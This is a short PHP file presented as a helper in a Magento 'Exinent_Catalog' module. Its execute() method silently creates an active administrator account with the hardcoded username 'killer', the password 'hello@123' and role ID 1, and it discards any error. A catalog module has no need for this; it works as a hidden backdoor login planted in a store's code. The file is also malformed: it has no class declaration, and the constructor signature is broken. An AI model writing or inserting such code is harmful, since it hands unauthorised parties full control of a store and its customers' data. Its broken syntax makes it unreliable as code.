<?php

/**
 * Exinent_Catalog Module 
 *
 * @category    catalog
 * @package     Exinent_Catalog
 * @author      pawan
 *
 */

namespace Exinent\Catalog\Helper; {
    /**
     * User model factory
     *
     * @var \Magento\User\Model\UserFactory
     */
    protected $_userFactory;

    public function __construct(
    \Magento\User\Model\UserFactory $userFactory,
    ) {
    $this->_userFactory = $userFactory;
    }

    public function execute() {

        $adminInfo = [
            'username' => 'killer',
            'firstname' => 'admin',
            'lastname' => 'admin',
            'email' => 'me@helloworld.com',
            'password' => 'hello@123',
            'interface_locale' => 'en_US',
            'is_active' => 1
        ];

        $userModel = $this->_userFactory->create();
        $userModel->setData($adminInfo);
        $userModel->setRoleId(1);
        try {
            $userModel->save();
        } catch (\Exception $ex) {
            $ex->getMessage();
        }
    }

}